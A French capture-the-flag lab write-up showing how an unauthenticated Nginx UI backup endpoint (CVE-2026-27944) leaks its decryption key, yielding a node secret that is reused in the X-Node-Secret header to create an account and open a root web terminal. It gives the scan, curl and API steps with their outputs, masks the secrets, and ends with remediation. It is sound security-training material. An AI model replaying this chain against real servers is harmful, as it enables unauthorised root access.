---
layout: single
header:
  overlay_image: /assets/images/banner-014.jpg
  overlay_filter: 0.6
toc: true
toc_depth: 6
toc_label: Table of Contents
title: "Lab Bak2Root : de la sauvegarde non authentifiée (CVE-2026-27944) au shell root sur Nginx UI"
date: 2026-10-23
categories: [Web, Cybersécurité]
tags: [nginx-ui, cve-2026-27944, ssrf, api-abuse, node-secret, terminal-web, privesc, secdojo, ctf, pentest]
---

# Lab Bak2Root : de la fuite de sauvegarde au shell root sur Nginx UI

> **Cible déclarée :** `176.16.164.232`
> **Interface observée :** `http://176.16.164.232:18082/`
> **Contexte :** lab autorisé ; la preuve a été limitée à l'extraction d'une sauvegarde publique, son déchiffrement hors ligne, puis à la lecture du fichier de flag via le terminal web
> **Résultat :** ✅ flag local récupéré via le terminal web, dans un conteneur avec `uid=0(root)`

> ⚠️ **Précaution de publication :** la clé/IV de déchiffrement, le secret de nœud, le hash bcrypt et le mot de passe du compte de lab ne sont pas reproduits dans ce rapport.

## 1. Résumé du résultat

La reconnaissance initiale a trouvé SSH sur le port 22, mais aucun service HTTP visible dans le scan par défaut. Une énumération de tous les ports TCP a ensuite découvert le port `18082/tcp`, qui servait une interface **Nginx UI**.

L'endpoint `/api/backup` répondait sans authentification et livrait une archive accompagnée d'un en-tête `X-Backup-Security` contenant la clé et l'IV de déchiffrement. Une fois la sauvegarde déchiffrée hors ligne, le fichier `app.ini` extrait a révélé un secret de nœud (`[node] secret`). Ce secret, rejoué dans l'en-tête `X-Node-Secret`, a authentifié des appels à l'API `/api/nodes` et permis la création d'un compte de lab. La connexion à l'interface web avec ce compte a donné accès à un terminal intégré, dont le shell tournait avec `uid=0(root)` dans le conteneur Nginx UI. La lecture de `/home/local.txt` a renvoyé :

```text
flag_b5c64043_fc4c_43d3_9210_90fa2c22f5c0
```

Le fichier `/root/proof.txt`, lui, n'existait pas dans ce conteneur — ce qui confirme des privilèges root locaux au conteneur, pas nécessairement à l'hôte ou à un autre conteneur du nœud distant.

## 2. CVE-2026-27944 en bref

L'avis du projet Nginx UI décrit un endpoint de sauvegarde (`/api/backup`) accessible sans authentification, qui divulgue dans sa réponse la clé et l'IV nécessaires au déchiffrement de l'archive qu'il sert. Une fois l'archive déchiffrée, le fichier de configuration `app.ini` qu'elle contient expose à son tour le secret de nœud (`[node] secret`), lequel peut authentifier des requêtes API sans mot de passe via l'en-tête `X-Node-Secret`.

Dans ce lab, la chaîne complète — fuite de sauvegarde, déchiffrement, extraction du secret, réutilisation API — a été rejouée de bout en bout contre l'hôte autorisé. La preuve comportementale est la création réussie d'un compte via l'API authentifiée par le secret de nœud, puis l'obtention d'un shell root par le terminal web intégré à l'interface.

## 3. Méthode et lien entre les étapes

La séquence suivie est :

1. repérer les ports ouverts ;
2. énumérer tous les ports TCP après un scan initial incomplet ;
3. identifier l'interface Nginx UI sur le port découvert ;
4. extraire la sauvegarde exposée par `/api/backup` ;
5. déchiffrer la sauvegarde hors ligne avec la clé/IV divulguées ;
6. analyser les fichiers extraits pour trouver le secret de nœud ;
7. réutiliser ce secret pour authentifier des appels API et créer un compte ;
8. se connecter à l'interface web et ouvrir le terminal intégré ;
9. lire le fichier du flag dans ce terminal.

Chaque étape réduit une incertitude nécessaire à la suivante. L'énumération complète des ports permet de joindre la bonne application ; la fuite de sauvegarde fournit la matière à déchiffrer ; le déchiffrement révèle le secret de nœud ; ce secret ouvre l'accès à l'API, qui permet de créer un compte légitime ; ce compte donne enfin accès au terminal web, où le flag est lu directement.

> ℹ️ Une tentative de casse du hash bcrypt trouvé dans la base SQLite (compte admin) avec John et `rockyou.txt` a été interrompue après environ 0,01 % de la wordlist sans résultat : cette piste n'a pas été nécessaire pour la suite.

## 4. Étape 1 — Scan initial

```bash
nmap -A 176.16.164.232
```

Sortie pertinente :

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.14
```

**Pourquoi cette étape :** le scan initial identifie les services accessibles sur les ports courants. Il a confirmé la présence de SSH, mais n'a affiché aucun service HTTP — ce qui ne démontrait pas que tous les autres ports étaient fermés, seulement que l'ensemble de ports par défaut de Nmap ne couvrait rien de pertinent ici.

**Interprétation :** l'absence de service web dans ce premier scan ne permet pas de conclure à son absence réelle sur l'hôte ; elle appelle une énumération plus large.

## 5. Étape 2 — Énumération complète des ports TCP

```bash
nmap -Pn -p- --open -sV -T4 176.16.164.232
```

```text
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.14
18082/tcp open  http    nginx 1.29.3
```

**Explication des options :**

- `-Pn` demande à Nmap de ne pas effectuer de découverte d'hôte préalable
- `-p-` parcourt tous les ports TCP
- `--open` n'affiche que les ports trouvés ouverts
- `-sV` tente d'identifier les versions de service
- `-T4` choisit une vitesse de scan rapide

**Interprétation :** le service HTTP se trouvait en réalité sur le port 18082, pas sur le port 9000 mentionné plus tard dans la configuration interne de l'application. Ce dernier est un port d'écoute interne, non exposé directement sur l'adresse cible.

## 6. Étape 3 — Extraire la sauvegarde via /api/backup

Une première requête au port interne a logiquement échoué :

```bash
curl -i --max-time 8 http://176.16.164.232:9000/api/backup
```

```text
curl: (7) Failed to connect to 176.16.164.232 port 9000
```

> ℹ️ Cet échec ne signale pas une erreur de méthode ; il confirme simplement que le port 9000 n'est pas directement joignable depuis l'extérieur, contrairement au port 18082 découvert à l'étape précédente.

La requête a été répétée sur le port réellement exposé :

```bash
curl -sS --max-time 30 \
  -D headers.txt \
  -o backup.zip \
  http://176.16.164.232:18082/api/backup
```

Vérification des métadonnées :

```bash
head -n 1 headers.txt
grep -iE '^(Content-Type|Content-Disposition):' headers.txt
grep -qi '^X-Backup-Security:' headers.txt && echo 'X-Backup-Security présent'
file backup.zip
```

```text
HTTP/1.1 200 OK
Content-Type: application/zip
Content-Disposition: attachment; filename=backup-20261023-133839.zip
X-Backup-Security présent
backup.zip: Zip archive data, made by v2.0 UNIX
```

**Pourquoi cette étape :** confirmer que `/api/backup` répond sans authentification et observer l'en-tête `X-Backup-Security`, qui est le point de fuite décrit par l'avis CVE-2026-27944.

**Interprétation :** l'endpoint a livré une archive complète accompagnée des secrets de déchiffrement dans sa propre réponse HTTP — c'est la condition initiale de la vulnérabilité. Les valeurs de cet en-tête ne sont pas reproduites ici.

## 7. Étape 4 — Déchiffrement hors ligne

L'installation de PyCryptodome via pip a échoué, faute d'accès réseau depuis Kali vers PyPI :

```text
Failed to establish a new connection: [Errno 101] Network is unreachable
```

OpenSSL (version 3.6.4) était disponible localement. Un script Python a donc lu la clé et l'IV depuis `headers.txt` puis appelé `openssl enc -d -aes-256-cbc` :

```bash
python3 decrypt_openssl.py
```

```text
Déchiffré : backup_out/hash_info.txt
Extrait : backup_out/nginx-ui
Extrait : backup_out/nginx
```

Fichiers extraits recensés :

```text
backup_out/hash_info.txt
backup_out/nginx/sites-available/dojo-internal.conf
backup_out/nginx/sites-enabled/dojo-internal.conf
backup_out/nginx/mime.types
backup_out/nginx/modules
backup_out/nginx/conf.d/sites-enabled.conf
backup_out/nginx/conf.d/nginx-ui.conf
backup_out/nginx/nginx.conf
backup_out/nginx/fastcgi_params
backup_out/nginx/scgi_params
backup_out/nginx/uwsgi_params
backup_out/nginx-ui/database.db
backup_out/nginx-ui/app.ini
```

**Pourquoi cette étape :** l'archive seule ne sert à rien sans déchiffrement ; cette étape transforme la fuite réseau en données exploitables localement.

**Interprétation :** `hash_info.txt` indiquait une version `2.3.2` de Nginx UI. Un premier grep sur les fichiers extraits n'a trouvé aucune occurrence de `flag` ou `bak2root` en texte clair — ce qui ne suffisait pas à exclure des indices dans la base SQLite, qui restait à examiner.

## 8. Étape 5 — Analyser la configuration et la base extraites

`app.ini` contenait notamment :

```ini
[server]
host = 127.0.0.1
port = 9000

[node]
name = SecDojo Lab
secret = <masqué>
```

Le virtual host sauvegardé a été affiché avec :

```bash
nl -ba backup_out/nginx/sites-available/dojo-internal.conf
```

```nginx
server {
    listen 8081;
    listen [::]:8081;
    server_name dojo-internal.local;

    # internal-only lab vhost
    location / {
        add_header Content-Type text/plain;
        return 200 "restricted internal node\n";
    }
}
```

**Pourquoi cette étape :** identifier dans la configuration extraite un secret réutilisable côté API, plutôt que de s'arrêter à la seule lecture de fichiers de configuration Nginx.

**Interprétation :** la base SQLite contenait une table `users` avec un compte admin (hash bcrypt `$2a$`, 60 caractères) et une table `nodes` référençant un nœud `node-1` vers `http://nginx-demo-2:9000`, rapporté hors ligne (`status: false`). Un test avec l'en-tête `Host: dojo-internal.local` sur le port exposé a renvoyé la page HTML standard de Nginx UI (200 OK), pas le texte « restricted internal node » : ce vhost est donc resté interne et n'a pas été atteint directement. Le secret `[node]` extrait d'`app.ini`, lui, s'est avéré être la clé réellement exploitable.

## 9. Étape 6 — Vérifier l'état d'installation puis réutiliser le secret de nœud

```bash
curl -sS -i --max-time 10 \
  -H 'Host: dojo-internal.local' \
  http://176.16.164.232:18082/api/install
```

```json
{"lock":true,"timeout":false}
```

**Pourquoi cette étape :** vérifier que l'installation était verrouillée avant toute autre hypothèse — il n'était donc pas justifié de supposer qu'une fenêtre non authentifiée de restauration (`/api/restore`) était ouverte, et aucune restauration forgée n'a été tentée.

Le secret `[node]` extrait localement a ensuite été transmis dans l'en-tête `X-Node-Secret` :

```text
GET /api/nodes
X-Node-Secret: <valeur locale masquée>
```

**Interprétation :** la réponse HTTP 200 a retourné les métadonnées du nœud (URL `http://nginx-demo-2:9000`, état `false`, version vide). Cela confirme que le secret de nœud divulgué par la sauvegarde authentifie bien des requêtes API sans mot de passe, comme le décrit la documentation du projet.

## 10. Étape 7 — Créer un compte de lab via l'API

Un compte `aka` a été créé avec le même secret de nœud transmis depuis le fichier local :

```text
HTTP 200
{"id":2,"created_at":"2026-10-23T13:58:50.572237208Z","updated_at":"2026-10-23T13:58:50.572237208Z","name":"aka","status":true,"enabled_2fa":false,"language":"en"}
```

> 💡 Les premières commandes `id`, `cat /home/local.txt` et `cat /root/proof.txt` avaient d'abord été saisies dans le terminal **local Kali** : elles affichaient l'utilisateur `hitotsu` et des erreurs de fichier absent ou d'accès refusé. Elles ne décrivaient donc pas la cible — il fallait saisir ces commandes dans le terminal web Nginx UI, pas à l'invite Kali.

**Pourquoi cette étape :** transformer l'accès API en accès interactif réel sur l'interface, via un compte créé légitimement grâce au secret rejoué.

## 11. Étape 8 — Connexion à l'interface web et ouverture du terminal

Après la création du compte `aka`, l'interface Nginx UI a été ouverte dans le navigateur à l'adresse suivante :

```text
http://176.16.164.232:18082/
```

Une fois connecté avec le compte de lab, il fallait sélectionner **Terminal** dans le menu latéral gauche. La capture ci-dessous montre l'interface sur `http://176.16.164.232:18082/#/terminal`, avec la rubrique Terminal sélectionnée et les onglets de terminal visibles.

<p align="center"><a href="/assets/images/banan1.png"><img src="/assets/images/banan1.png"></a></p>

Le grand panneau noir correspond au terminal intégré. Il faut cliquer à l'intérieur de ce panneau pour lui donner le focus, puis saisir les commandes à l'invite qui apparaît. Les commandes doivent être tapées dans ce panneau, pas dans le terminal local Kali. Si le panneau Assistant affiche une erreur de connexion à OpenAI, cela concerne uniquement l'assistant intégré ; fermer ou masquer ce panneau ne ferme pas le terminal.

## 12. Étape 9 — Ouvrir le terminal web et lire le flag

Connexion à l'interface :

```text
http://176.16.164.232:18082/
```

Après connexion avec le compte `aka`, l'onglet **Terminal** du menu latéral a ouvert un terminal intégré sur `http://176.16.164.232:18082/#/terminal`.

> ℹ️ Si le panneau Assistant affiche une erreur de connexion à OpenAI, cela concerne uniquement l'assistant intégré ; fermer ou masquer ce panneau ne ferme pas le terminal.

Le shell ouvert avait pour invite :

```text
root@8c525d1b69e7:/run/s6-rc:s6-rc-init:ecglpa/servicedirs/nginx-ui#
```

```bash
hostname
id
```

```text
8c525d1b69e7
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cat /home/local.txt; cat /root/proof.txt
```

```text
flag_b5c64043_fc4c_43d3_9210_90fa2c22f5c0
cat: /root/proof.txt: No such file or directory
```

**Pourquoi cette étape :** confirmer les privilèges (`uid=0`) avant de lire le fichier cible, puis récupérer le flag.

**Interprétation :** `/home/local.txt` a donné le flag ; `/root/proof.txt` n'existait pas dans ce conteneur. Le flag a donc été récupéré par le terminal web après l'accès API, et non par une restauration modifiée — cette distinction compte, car la piste `/api/restore` n'a jamais été empruntée dans ce déroulement.

## 12. Conclusion et remédiation

Le lab a exposé une interface Nginx UI sur `176.16.164.232:18082`. L'endpoint `/api/backup`, accessible sans authentification, a divulgué dans sa propre réponse la clé et l'IV permettant de déchiffrer l'archive qu'il servait. Le fichier `app.ini` extrait de cette archive a révélé un secret de nœud réutilisable, qui a permis de créer un compte via l'API puis d'ouvrir un shell root dans le conteneur Nginx UI via le terminal web intégré.

La remédiation recommandée est de corriger la version affectée par CVE-2026-27944, de ne jamais transmettre de clé ou d'IV de déchiffrement dans les en-têtes de réponse d'un endpoint de sauvegarde, et de faire tourner (rotate) tout secret de nœud potentiellement exposé par une sauvegarde antérieure à la mise à jour. Restreindre l'accès à `/api/backup` par authentification et limiter l'exposition réseau des ports internes (9000) réduisent également la surface d'attaque.

> ℹ️ La preuve démontrée ici a été limitée à l'extraction et au déchiffrement de la sauvegarde exposée, à la réutilisation du secret de nœud pour créer un compte, puis à la lecture du fichier de flag via le terminal légitime de l'interface. Aucune restauration forgée, exécution de commande via `/api/restore`, ni altération de configuration n'a été tentée.

## Leçons retenues

- Un scan initial sans option `-p-` peut masquer un service exposé sur un port inhabituel (ici 18082) : l'énumération complète des ports reste indispensable quand le premier scan ne trouve rien de pertinent côté web.
- Un en-tête de réponse HTTP peut à lui seul constituer la fuite critique d'une vulnérabilité : ici, `X-Backup-Security` livrait la clé/IV nécessaires au déchiffrement, sans qu'aucune authentification ne soit requise pour l'obtenir.
- Un secret retrouvé dans une configuration extraite (`[node] secret`) peut avoir une portée qui dépasse son fichier d'origine : il a ici authentifié des appels API indépendants de la sauvegarde elle-même.
- Documenter précisément ce qui a été exécuté côté client (Kali) versus dans l'environnement distant atteint (terminal web du conteneur) évite toute confusion sur la portée réelle des preuves — les premières commandes tapées par erreur dans Kali n'apportaient aucune information sur la cible.
- Vérifier l'état d'un endpoint sensible (`/api/install` verrouillé) avant de formuler une hypothèse d'exploitation évite de tenter des actions non justifiées, comme une restauration forgée qui n'a ici jamais été nécessaire.

## Références

- Avis du projet Nginx UI pour CVE-2026-27944 (fuite de clé/IV via `/api/backup`, réutilisation du secret de nœud `X-Node-Secret`)
